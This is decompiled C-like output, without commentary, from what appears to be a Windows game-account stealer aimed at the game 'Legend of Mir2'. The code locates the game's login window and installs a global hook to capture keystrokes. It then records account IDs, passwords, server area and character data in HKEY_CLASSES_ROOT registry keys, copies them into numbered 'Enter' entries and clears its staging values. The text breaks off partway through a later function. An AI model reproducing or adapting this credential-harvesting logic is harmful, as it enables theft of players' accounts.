// 428100: using guessed type int dword_428100;
// 42E13C: using guessed type int dword_42E13C;

//----- (0042812C) --------------------------------------------------------
LRESULT __userpurge fn@<eax>(int a1@<edi>, int a2@<esi>, int code, WPARAM wParam, _DWORD *lParam)
{
  if ( *lParam == 256 )
  {
    sub_427F04((int)lParam);
  }
  else if ( *lParam == 513 )
  {
    sub_426DFC(513, a1, a2);
  }
  return 0;
}

//----- (00428164) --------------------------------------------------------
void __userpurge TimerFunc(int a1@<ebx>, int a2@<esi>, HWND a3, UINT a4, UINT_PTR a5, DWORD a6)
{
  HWND Window; // ebx
  char *v7; // ecx
  HWND v8; // ebx
  char *v9; // eax
  int v10; // eax
  int v11; // ebx
  int v12; // esi
  char *v13; // ecx
  int v14; // edi
  char *v15; // eax
  int v16; // ebx
  char *v17; // eax
  HWND v18; // ebx
  int v19; // edi
  char *v20; // eax
  char *v21; // eax
  bool v22; // zf
  bool v23; // zf
  int v24; // esi
  HWND v25; // eax
  int v26; // esi
  char *v27; // eax
  char *v28; // eax
  char *v29; // eax
  char *v30; // eax
  char *v31; // eax
  int v32; // esi
  char *v33; // ecx
  int v34; // esi
  char *v35; // eax
  char *v36; // eax
  char *v37; // eax
  char *v38; // eax
  char *v39; // eax
  char *v40; // eax
  char *v41; // eax
  char *v42; // eax
  char *v43; // eax
  char *v44; // eax
  char *v45; // eax
  char *v46; // eax
  char *v47; // eax
  char *v48; // eax
  int i; // esi
  char *v50; // eax
  char *v51; // ecx
  HWND v52; // ebx
  int v53; // esi
  char *v54; // eax
  char *v55; // [esp-8h] [ebp-268h]
  char *ExceptionList; // [esp-4h] [ebp-264h] BYREF
  int ForegroundWindow; // [esp+0h] [ebp-260h]
  BYTE *v58; // [esp+4h] [ebp-25Ch]
  unsigned int v59[2]; // [esp+8h] [ebp-258h] BYREF
  int *v60; // [esp+10h] [ebp-250h]
  char *v61; // [esp+20h] [ebp-240h] BYREF
  char *v62; // [esp+24h] [ebp-23Ch] BYREF
  char *v63; // [esp+28h] [ebp-238h] BYREF
  char *v64; // [esp+2Ch] [ebp-234h] BYREF
  char *v65; // [esp+30h] [ebp-230h] BYREF
  char *v66; // [esp+34h] [ebp-22Ch] BYREF
  char *v67; // [esp+38h] [ebp-228h] BYREF
  char *v68; // [esp+3Ch] [ebp-224h] BYREF
  char *v69; // [esp+40h] [ebp-220h] BYREF
  char *v70; // [esp+44h] [ebp-21Ch] BYREF
  char *v71; // [esp+48h] [ebp-218h] BYREF
  char *v72; // [esp+4Ch] [ebp-214h] BYREF
  char *v73; // [esp+50h] [ebp-210h] BYREF
  char *v74; // [esp+54h] [ebp-20Ch] BYREF
  char *v75; // [esp+58h] [ebp-208h] BYREF
  char *v76; // [esp+5Ch] [ebp-204h] BYREF
  char *v77; // [esp+60h] [ebp-200h] BYREF
  char *v78; // [esp+64h] [ebp-1FCh] BYREF
  char *v79; // [esp+68h] [ebp-1F8h] BYREF
  char *v80; // [esp+6Ch] [ebp-1F4h] BYREF
  char *v81; // [esp+70h] [ebp-1F0h] BYREF
  char *v82; // [esp+74h] [ebp-1ECh] BYREF
  char *v83; // [esp+78h] [ebp-1E8h] BYREF
  char *v84; // [esp+7Ch] [ebp-1E4h] BYREF
  char *v85; // [esp+80h] [ebp-1E0h] BYREF
  char *v86; // [esp+84h] [ebp-1DCh] BYREF
  char *v87; // [esp+88h] [ebp-1D8h] BYREF
  char *v88; // [esp+8Ch] [ebp-1D4h] BYREF
  char *v89; // [esp+90h] [ebp-1D0h] BYREF
  char *v90; // [esp+94h] [ebp-1CCh] BYREF
  char *v91; // [esp+98h] [ebp-1C8h] BYREF
  char *v92; // [esp+9Ch] [ebp-1C4h] BYREF
  char *v93; // [esp+A0h] [ebp-1C0h] BYREF
  char *v94; // [esp+A4h] [ebp-1BCh] BYREF
  char *v95; // [esp+A8h] [ebp-1B8h] BYREF
  char *v96; // [esp+ACh] [ebp-1B4h] BYREF
  char *v97; // [esp+B0h] [ebp-1B0h] BYREF
  char *v98; // [esp+B4h] [ebp-1ACh] BYREF
  char *v99; // [esp+B8h] [ebp-1A8h] BYREF
  char *v100; // [esp+BCh] [ebp-1A4h] BYREF
  char *v101; // [esp+C0h] [ebp-1A0h] BYREF
  char *v102; // [esp+C4h] [ebp-19Ch] BYREF
  char *v103; // [esp+C8h] [ebp-198h] BYREF
  char *v104; // [esp+CCh] [ebp-194h] BYREF
  char *v105; // [esp+D0h] [ebp-190h] BYREF
  char *v106; // [esp+D4h] [ebp-18Ch] BYREF
  char *v107; // [esp+D8h] [ebp-188h] BYREF
  char *v108; // [esp+DCh] [ebp-184h] BYREF
  char *v109; // [esp+E0h] [ebp-180h] BYREF
  char *v110; // [esp+E4h] [ebp-17Ch] BYREF
  char *v111; // [esp+E8h] [ebp-178h] BYREF
  char *v112; // [esp+ECh] [ebp-174h] BYREF
  char *v113; // [esp+F0h] [ebp-170h] BYREF
  char *v114; // [esp+F4h] [ebp-16Ch] BYREF
  char *v115; // [esp+F8h] [ebp-168h] BYREF
  char *v116; // [esp+FCh] [ebp-164h] BYREF
  char *v117; // [esp+100h] [ebp-160h] BYREF
  char *v118; // [esp+104h] [ebp-15Ch] BYREF
  char *v119; // [esp+108h] [ebp-158h] BYREF
  char *v120; // [esp+10Ch] [ebp-154h] BYREF
  __int32 v121; // [esp+110h] [ebp-150h] BYREF
  char *v122; // [esp+114h] [ebp-14Ch] BYREF
  char *v123; // [esp+118h] [ebp-148h] BYREF
  char *v124; // [esp+11Ch] [ebp-144h] BYREF
  char *v125; // [esp+120h] [ebp-140h] BYREF
  char *v126; // [esp+124h] [ebp-13Ch] BYREF
  char *v127; // [esp+128h] [ebp-138h] BYREF
  char *v128; // [esp+12Ch] [ebp-134h] BYREF
  char *v129; // [esp+130h] [ebp-130h] BYREF
  char *v130; // [esp+134h] [ebp-12Ch] BYREF
  char *v131; // [esp+138h] [ebp-128h] BYREF
  char *v132; // [esp+13Ch] [ebp-124h] BYREF
  char *v133; // [esp+140h] [ebp-120h] BYREF
  char *v134; // [esp+144h] [ebp-11Ch] BYREF
  BYTE lParam[256]; // [esp+148h] [ebp-118h] BYREF
  char *v136; // [esp+248h] [ebp-18h] BYREF
  char v137; // [esp+24Fh] [ebp-11h]
  char *v138; // [esp+250h] [ebp-10h] BYREF
  int v139; // [esp+254h] [ebp-Ch]
  HWND hWndParent; // [esp+258h] [ebp-8h]
  HWND WindowA; // [esp+25Ch] [ebp-4h]
  int savedregs; // [esp+260h] [ebp+0h] BYREF

  v60 = &savedregs;
  v59[1] = (unsigned int)&loc_429541;
  v59[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v59);
  sub_40CE30();
  if ( !(unsigned __int8)sub_40E944("WinX", HKEY_CLASSES_ROOT, "legend of mir2", a1) )
  {
    if ( (unsigned int)(-sub_40D394() - 2) >= 2 )
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "WinX", 1, (BYTE *)&dword_429570);
    else
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "WinX", 1, (BYTE *)"1");
  }
  if ( !*(_BYTE *)off_42BA40 && !(unsigned __int8)sub_40E944("NowCount", HKEY_CLASSES_ROOT, "legend of mir2", a1) )
    sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "NowCount", 1, (BYTE *)"0");
  hWndParent = FindWindowA("TfrmMain", "");
  v137 = 0;
  if ( hWndParent )
  {
    Window = FindWindowExA(hWndParent, 0, "TComboBox", 0);
    if ( Window )
    {
      SendMessageA(Window, 0xDu, 0x100u, (LPARAM)lParam);
      sub_4044D4(&v134, (char *)lParam, 256);
      Delphi_CompareCall_404668((int)v134, (int *)dword_42E140);
      if ( !v22 )
      {
        sub_4044D4((char **)&dword_42E140, (char *)lParam, 256);
        sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "Area", 1, lParam);
        v137 = 1;
        sub_40E6F4("ServerListok", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "ServerListCount", &v133);
        WindowA = (HWND)sub_40C610((int)v133, v7);
        v8 = WindowA;
        if ( (int)WindowA > 0 )
        {
          a2 = 1;
          do
          {
            sub_40C670(a2, (volatile __int32 *)&v131);
            sub_404570((volatile __int32 *)&v132, "ServerList", v131);
            v9 = sub_40471C(v132);
            sub_40E6F4(v9, HKEY_CLASSES_ROOT, "legend of mir2");
            ++a2;
            v8 = (HWND)((char *)v8 - 1);
          }
          while ( v8 );
        }
        sub_40E6F4("ServerListCount", HKEY_CLASSES_ROOT, "legend of mir2");
      }
      if ( !byte_42E144 )
      {
        sub_40DC74(a2);
        byte_42E144 = 1;
      }
    }
    if ( v137 )
    {
      byte_42E144 = 0;
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag", &v130);
      Delphi_CompareCall_404668((int)v130, dword_4295F4);
      if ( !v22 )
      {
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "ServerListok", &v129);
        Delphi_CompareCall_404668((int)v129, dword_4295F4);
        if ( !v22 )
        {
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Area", &v138);
          if ( v138 )
          {
            v10 = sub_405594(*off_42B87C);
            if ( v10 >= 0 )
            {
              v11 = v10 + 1;
              v12 = 0;
              while ( 1 )
              {
                Delphi_CompareCall_404668(*(_DWORD *)(*off_42B87C + 4 * v12), (int *)v138);
                if ( v22 )
                  break;
                ++v12;
                if ( !--v11 )
                  goto LABEL_31;
              }
              sub_40C670(v12 + 1, (volatile __int32 *)&v126);
              sub_404570((volatile __int32 *)&v127, "Server", v126);
              ExceptionList = v127;
              sub_40D304(&v125);
              sub_40452C(&v125, (__int32)"zhjfile2.ini");
              sub_40D2A4(v125, ExceptionList, "ServerCount", &v128, (char *)dword_429600);
              v14 = sub_40C610((int)v128, v13);
              sub_40C670(v14, (volatile __int32 *)&v124);
              v15 = sub_40471C(v124);
              sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "ServerListCount", 1, (BYTE *)v15);
              if ( v14 > 0 )
              {
                v16 = 1;
                do
                {
                  sub_40C670(v16, &v121);
                  sub_4045E4((volatile __int32 *)&v122, 3);
                  ExceptionList = v122;
                  sub_40C670(v12 + 1, (volatile __int32 *)&v119);
                  sub_404570((volatile __int32 *)&v120, "Server", v119);
                  v55 = v120;
                  sub_40D304(&v118);
                  sub_40452C(&v118, (__int32)"zhjfile2.ini");
                  sub_40D2A4(v118, v55, ExceptionList, &v123, 0);
                  v58 = (BYTE *)sub_40471C(v123);
                  sub_40C670(v16, (volatile __int32 *)&v116);
                  sub_404570((volatile __int32 *)&v117, "ServerList", v116);
                  v17 = sub_40471C(v117);
                  sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", v17, 1, v58);
                  ++v16;
                  --v14;
                }
                while ( v14 );
              }
              sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "ServerListok", 1, (BYTE *)"1");
            }
          }
        }
      }
    }
  }
  else
  {
    sub_40426C(&dword_42E140);
  }
LABEL_31:
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Area", &v138);
  if ( !v138 )
    sub_40426C(&dword_42E140);
  v18 = 0;
  v139 = 0;
  v19 = 0;
  WindowA = FindWindowA("TfrmMain", "legend of mir2");
  if ( !WindowA )
  {
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "realtitle", &v138);
    if ( v138 )
    {
      v20 = sub_40471C(v138);
      WindowA = FindWindowA("TfrmMain", v20);
    }
    if ( !WindowA )
    {
      sub_40426C(&v136);
      WindowA = sub_40C054((int)"TfrmMain", (int)"legend of mir2", (volatile __int32 *)&v136);
      if ( v136 )
      {
        Delphi_CompareCall_404668((int)v136, (int *)v138);
        if ( !v22 )
        {
          v21 = sub_40471C(v136);
          sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "realtitle", 1, (BYTE *)v21);
        }
      }
    }
  }
  if ( !WindowA
    || (sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag", &v115),
        Delphi_CompareCall_404668((int)v115, dword_4295F4),
        !v22)
    || (sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag1", &v114), v114) )
  {
    if ( WindowA )
    {
      v58 = 0;
      ForegroundWindow = (int)GetForegroundWindow();
      v22 = (int)WindowA >= 0;
      if ( (int)WindowA >= 0 )
        v22 = WindowA == (HWND)ForegroundWindow;
      if ( v22 )
      {
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag", &v113);
        Delphi_CompareCall_404668((int)v113, dword_4295F4);
        if ( v22 )
        {
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag1", &v112);
          Delphi_CompareCall_404668((int)v112, dword_4295F4);
          if ( v22 )
            goto LABEL_49;
        }
      }
    }
    if ( WindowA
      && (sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag2", &v111),
          Delphi_CompareCall_404668((int)v111, dword_4295F4),
          v22) )
    {
      if ( hhk && UnhookWindowsHookEx(hhk) )
        hhk = 0;
      if ( dword_42CD1C && UnhookWindowsHookEx(dword_42CD1C) )
        dword_42CD1C = 0;
      sub_40E6F4("ID", HKEY_CLASSES_ROOT, "legend of mir2");
      sub_40E6F4("PW", HKEY_CLASSES_ROOT, "legend of mir2");
      sub_40E6F4(dword_4296B0, HKEY_CLASSES_ROOT, "legend of mir2");
      sub_40E6F4(dword_4296B8, HKEY_CLASSES_ROOT, "legend of mir2");
      sub_40E6F4("Flag", HKEY_CLASSES_ROOT, "legend of mir2");
      sub_40E6F4("Flag1", HKEY_CLASSES_ROOT, "legend of mir2");
    }
    else
    {
      if ( WindowA )
      {
        v58 = 0;
        ForegroundWindow = (int)GetForegroundWindow();
        v23 = (int)WindowA >= 0;
        if ( (int)WindowA >= 0 )
          v23 = WindowA == (HWND)ForegroundWindow;
        if ( v23 )
        {
          v24 = 19;
          do
          {
            v25 = FindWindowExA(WindowA, v18, "TEdit", 0);
            v18 = v25;
            if ( !v25 )
              break;
            ++v139;
            if ( IsWindowVisible(v25) )
              ++v19;
            --v24;
          }
          while ( v24 );
        }
      }
      if ( v19 == 2 && v139 == 2 || v19 == 4 || v19 == 12 )
      {
LABEL_49:
        hhk = SetWindowsHookExA(0, (HOOKPROC)fn, hmod, 0);
        goto LABEL_120;
      }
      if ( !WindowA )
      {
        dword_42E14C = 0;
        dword_42E150 = 0;
        dword_42E154 = 0;
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag", &v110);
        Delphi_CompareCall_404668((int)v110, dword_4295F4);
        if ( !v22 || (sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag1", &v109), v109) )
        {
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag", &v99);
          Delphi_CompareCall_404668((int)v99, dword_4295F4);
          if ( v22 )
          {
            sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag1", &v98);
            Delphi_CompareCall_404668((int)v98, dword_4295F4);
            if ( v22 )
            {
              sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag2", &v97);
              if ( v97 )
              {
                sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "ZB", &v96);
                if ( v96 )
                {
                  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "NowCount", &v95);
                  if ( v95 )
                  {
                    v58 = (BYTE *)&savedregs;
                    ForegroundWindow = (int)&loc_428CF3;
                    ExceptionList = (char *)NtCurrentTeb()->NtTib.ExceptionList;
                    __writefsdword(0, (unsigned int)&ExceptionList);
                    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "NowCount", &v94);
                    v32 = sub_40C610((int)v94, v33);
                    __writefsdword(0, (unsigned int)ExceptionList);
                  }
                  else
                  {
                    v32 = 0;
                  }
                  if ( v32 > 0 && v32 < 5 )
                  {
                    v34 = 1;
                    sub_40426C(&v138);
                    while ( 1 )
                    {
                      sub_40C670(v34, (volatile __int32 *)&v93);
                      v35 = sub_40471C(v93);
                      if ( !(unsigned __int8)sub_40E97C(HKEY_CLASSES_ROOT, "legend of mir2\\Enter", v35) )
                        break;
                      if ( ++v34 > 99 )
                        goto LABEL_97;
                    }
                    sub_40C670(v34, (volatile __int32 *)&v138);
LABEL_97:
                    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", dword_4296B0, &v92);
                    v58 = (BYTE *)sub_40471C(v92);
                    ForegroundWindow = 1;
                    sub_404570((volatile __int32 *)&v91, "legend of mir2\\Enter\\", v138);
                    v36 = sub_40471C(v91);
                    sub_40E67C(HKEY_CLASSES_ROOT, v36, dword_4296B0, ForegroundWindow, v58);
                    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "ID", &v90);
                    v58 = (BYTE *)sub_40471C(v90);
                    ForegroundWindow = 1;
                    sub_404570((volatile __int32 *)&v89, "legend of mir2\\Enter\\", v138);
                    v37 = sub_40471C(v89);
                    sub_40E67C(HKEY_CLASSES_ROOT, v37, "ID", ForegroundWindow, v58);
                    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "PW", &v88);
                    v58 = (BYTE *)sub_40471C(v88);
                    ForegroundWindow = 1;
                    sub_404570((volatile __int32 *)&v87, "legend of mir2\\Enter\\", v138);
                    v38 = sub_40471C(v87);
                    sub_40E67C(HKEY_CLASSES_ROOT, v38, "PW", ForegroundWindow, v58);
                    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", dword_4296B8, &v86);
                    v58 = (BYTE *)sub_40471C(v86);
                    ForegroundWindow = 1;
                    sub_404570((volatile __int32 *)&v85, "legend of mir2\\Enter\\", v138);
                    v39 = sub_40471C(v85);
                    sub_40E67C(HKEY_CLASSES_ROOT, v39, dword_4296B8, ForegroundWindow, v58);
                    if ( (unsigned __int8)sub_40E944("JsN1", HKEY_CLASSES_ROOT, "legend of mir2", (int)v18)
                      && (unsigned __int8)sub_40E944("JsD1", HKEY_CLASSES_ROOT, "legend of mir2", (int)v18) )
                    {
                      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsN1", &v84);
                      v58 = (BYTE *)sub_40471C(v84);
                      ForegroundWindow = 1;
                      sub_404570((volatile __int32 *)&v83, "legend of mir2\\Enter\\", v138);
                      v40 = sub_40471C(v83);
                      sub_40E67C(HKEY_CLASSES_ROOT, v40, "JsN1", ForegroundWindow, v58);
                      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsZ1", &v82);
                      v58 = (BYTE *)sub_40471C(v82);
                      ForegroundWindow = 1;
                      sub_404570((volatile __int32 *)&v81, "legend of mir2\\Enter\\", v138);
                      v41 = sub_40471C(v81);
                      sub_40E67C(HKEY_CLASSES_ROOT, v41, "JsZ1", ForegroundWindow, v58);
                      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsD1", &v80);
                      v58 = (BYTE *)sub_40471C(v80);
                      ForegroundWindow = 1;
                      sub_404570((volatile __int32 *)&v79, "legend of mir2\\Enter\\", v138);
                      v42 = sub_40471C(v79);
                      sub_40E67C(HKEY_CLASSES_ROOT, v42, "JsD1", ForegroundWindow, v58);
                      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsS1", &v78);
                      v58 = (BYTE *)sub_40471C(v78);
                      ForegroundWindow = 1;
                      sub_404570((volatile __int32 *)&v77, "legend of mir2\\Enter\\", v138);
                      v43 = sub_40471C(v77);
                      sub_40E67C(HKEY_CLASSES_ROOT, v43, "JsS1", ForegroundWindow, v58);
                    }
                    if ( (unsigned __int8)sub_40E944("JsN2", HKEY_CLASSES_ROOT, "legend of mir2", (int)v18)
                      && (unsigned __int8)sub_40E944("JsD2", HKEY_CLASSES_ROOT, "legend of mir2", (int)v18) )
                    {
                      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsN2", &v76);
                      v58 = (BYTE *)sub_40471C(v76);
                      ForegroundWindow = 1;
                      sub_404570((volatile __int32 *)&v75, "legend of mir2\\Enter\\", v138);
                      v44 = sub_40471C(v75);
                      sub_40E67C(HKEY_CLASSES_ROOT, v44, "JsN2", ForegroundWindow, v58);
                      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsZ2", &v74);
                      v58 = (BYTE *)sub_40471C(v74);
                      ForegroundWindow = 1;
                      sub_404570((volatile __int32 *)&v73, "legend of mir2\\Enter\\", v138);
                      v45 = sub_40471C(v73);
                      sub_40E67C(HKEY_CLASSES_ROOT, v45, "JsZ2", ForegroundWindow, v58);
                      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsD2", &v72);
                      v58 = (BYTE *)sub_40471C(v72);
                      ForegroundWindow = 1;
                      sub_404570((volatile __int32 *)&v71, "legend of mir2\\Enter\\", v138);
                      v46 = sub_40471C(v71);
                      sub_40E67C(HKEY_CLASSES_ROOT, v46, "JsD2", ForegroundWindow, v58);
                      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "JsS2", &v70);
                      v58 = (BYTE *)sub_40471C(v70);
                      ForegroundWindow = 1;
                      sub_404570((volatile __int32 *)&v69, "legend of mir2\\Enter\\", v138);
                      v47 = sub_40471C(v69);
                      sub_40E67C(HKEY_CLASSES_ROOT, v47, "JsS2", ForegroundWindow, v58);
                    }
                    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "ZB", &v68);
                    v58 = (BYTE *)sub_40471C(v68);
                    ForegroundWindow = 1;
                    sub_404570((volatile __int32 *)&v67, "legend of mir2\\Enter\\", v138);
                    v48 = sub_40471C(v67);
                    sub_40E67C(HKEY_CLASSES_ROOT, v48, "ZB", ForegroundWindow, v58);
                    sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "Flag2", 1, (BYTE *)"1");
                  }
                }
              }
            }
          }
        }
        else if ( (unsigned __int8)sub_40E944("ID", HKEY_CLASSES_ROOT, "legend of mir2", (int)v18)
               && (unsigned __int8)sub_40E944("PW", HKEY_CLASSES_ROOT, "legend of mir2", (int)v18)
               && (unsigned __int8)sub_40E944(dword_4296B0, HKEY_CLASSES_ROOT, "legend of mir2", (int)v18) )
        {
          v26 = 1;
          sub_40426C(&v138);
          while ( 1 )
          {
            sub_40C670(v26, (volatile __int32 *)&v108);
            v27 = sub_40471C(v108);
            if ( !(unsigned __int8)sub_40E97C(HKEY_CLASSES_ROOT, "legend of mir2\\Enter", v27) )
              break;
            if ( ++v26 > 99 )
              goto LABEL_83;
          }
          sub_40C670(v26, (volatile __int32 *)&v138);
LABEL_83:
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", dword_4296B0, &v107);
          v58 = (BYTE *)sub_40471C(v107);
          sub_404570((volatile __int32 *)&v106, "legend of mir2\\Enter\\", v138);
          v28 = sub_40471C(v106);
          sub_40E67C(HKEY_CLASSES_ROOT, v28, dword_4296B0, 1, v58);
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "ID", &v105);
          v58 = (BYTE *)sub_40471C(v105);
          sub_404570((volatile __int32 *)&v104, "legend of mir2\\Enter\\", v138);
          v29 = sub_40471C(v104);
          sub_40E67C(HKEY_CLASSES_ROOT, v29, "ID", 1, v58);
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "PW", &v103);
          v58 = (BYTE *)sub_40471C(v103);
          sub_404570((volatile __int32 *)&v102, "legend of mir2\\Enter\\", v138);
          v30 = sub_40471C(v102);
          sub_40E67C(HKEY_CLASSES_ROOT, v30, "PW", 1, v58);
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", dword_4296B8, &v101);
          v58 = (BYTE *)sub_40471C(v101);
          sub_404570((volatile __int32 *)&v100, "legend of mir2\\Enter\\", v138);
          v31 = sub_40471C(v100);
          sub_40E67C(HKEY_CLASSES_ROOT, v31, dword_4296B8, 1, v58);
        }
      }
      if ( !WindowA && !hWndParent
        || !WindowA
        && (sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Flag1", &v66),
            Delphi_CompareCall_404668((int)v66, dword_4295F4),
            v22) )
      {
        if ( hhk && UnhookWindowsHookEx(hhk) )
          hhk = 0;
        if ( dword_42CD1C && UnhookWindowsHookEx(dword_42CD1C) )
          dword_42CD1C = 0;
        sub_40E6F4("ID", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("PW", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4(dword_4296B0, HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4(dword_4296B8, HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("JsN1", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("JsZ1", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("JsD1", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("JsS1", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("JsN2", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("JsZ2", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("JsD2", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("JsS2", HKEY_CLASSES_ROOT, "legend of mir2");
        for ( i = 1; i != 8; ++i )
        {
          sub_40C670(i, (volatile __int32 *)&v64);
          sub_404570((volatile __int32 *)&v65, (char *)&dword_429748, v64);
          v50 = sub_40471C(v65);
          sub_40E6F4(v50, HKEY_CLASSES_ROOT, "legend of mir2");
        }
        sub_40E6F4("Area", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("ServerListok", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "ServerListCount", &v63);
        WindowA = (HWND)sub_40C610((int)v63, v51);
        v52 = WindowA;
        if ( (int)WindowA > 0 )
        {
          v53 = 1;
          do
          {
            sub_40C670(v53, (volatile __int32 *)&v61);
            sub_404570((volatile __int32 *)&v62, "ServerList", v61);
            v54 = sub_40471C(v62);
            sub_40E6F4(v54, HKEY_CLASSES_ROOT, "legend of mir2");
            ++v53;
            v52 = (HWND)((char *)v52 - 1);
          }
          while ( v52 );
        }
        sub_40E6F4("ServerListCount", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("Flag", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("Flag1", HKEY_CLASSES_ROOT, "legend of mir2");
        sub_40E6F4("Flag2", HKEY_CLASSES_ROOT, "legend of mir2");
      }
    }
  }
LABEL_120:
  __writefsdword(0, v59[0]);
  v60 = (int *)&loc_429548;
  sub_404290((int)&v61, 74);
  sub_40426C(&v136);
  sub_40426C(&v138);
}
// 42829B: variable 'v22' is possibly undefined
// 42830C: variable 'v7' is possibly undefined
// 4284BB: variable 'v13' is possibly undefined
// 428CE2: variable 'v33' is possibly undefined
// 42946C: variable 'v51' is possibly undefined
// 4295F4: using guessed type int dword_4295F4[3];
// 429600: using guessed type int dword_429600[3];
// 429748: using guessed type int dword_429748;
// 42B87C: using guessed type int *off_42B87C;
// 42BA40: using guessed type void *off_42BA40;
// 42E140: using guessed type int dword_42E140;
// 42E144: using guessed type char byte_42E144;
// 42E14C: using guessed type int dword_42E14C;
// 42E150: using guessed type int dword_42E150;
// 42E154: using guessed type int dword_42E154;
// 428164: using guessed type BYTE lParam[256];
// 428164: using guessed type char *var_18;

//----- (0042974C) --------------------------------------------------------
void __stdcall sub_42974C(HWND a1, UINT a2, UINT_PTR a3, DWORD a4)
{
  HWND WindowA; // ebx
  char *v5; // eax
  unsigned int v6[2]; // [esp-10h] [ebp-14h] BYREF
  int *v7; // [esp-8h] [ebp-Ch]
  char *v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_429849;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_40EC94(HKEY_CLASSES_ROOT, "legend of mir2\\Enter");
  sub_40EC94(HKEY_CLASSES_ROOT, "legend of mir2\\Change password");
  sub_40EC94(HKEY_CLASSES_ROOT, "legend of mir2\\Registry");
  sub_40EDE0(HKEY_CLASSES_ROOT, "legend of mir2\\Change password", (__int32)"Change password");
  sub_40EDE0(HKEY_CLASSES_ROOT, "legend of mir2\\Registry", (__int32)"Registry");
  ++dword_42E158;
  WindowA = FindWindowA("TfrmMain", "legend of mir2");
  if ( !WindowA )
  {
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "realtitle", &v8);
    if ( v8 )
    {
      v5 = sub_40471C(v8);
      WindowA = FindWindowA("TfrmMain", v5);
    }
  }
  if ( !WindowA || WindowA != GetForegroundWindow() || dword_42E158 <= 5 )
  {
    dword_42E158 = 0;
    if ( !byte_42E15C )
      sub_4119B0();
    sub_411390();
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_429850;
  sub_40426C(&v8);
}
// 42E158: using guessed type int dword_42E158;
// 42E15C: using guessed type char byte_42E15C;

//----- (004298FC) --------------------------------------------------------
_DWORD *__usercall sub_4298FC@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>)
{
  char v4; // zf
  int v5; // edi
  volatile __int32 *v6; // ebx
  __int32 *v7; // esi
  int v8; // edi
  volatile __int32 *v9; // esi
  int v10; // edi
  int *v11; // esi
  int v12; // edi
  char *v13; // esi
  __int32 v15; // [esp-18h] [ebp-184h]
  __int32 v16; // [esp-14h] [ebp-180h]
  int v17; // [esp-10h] [ebp-17Ch]
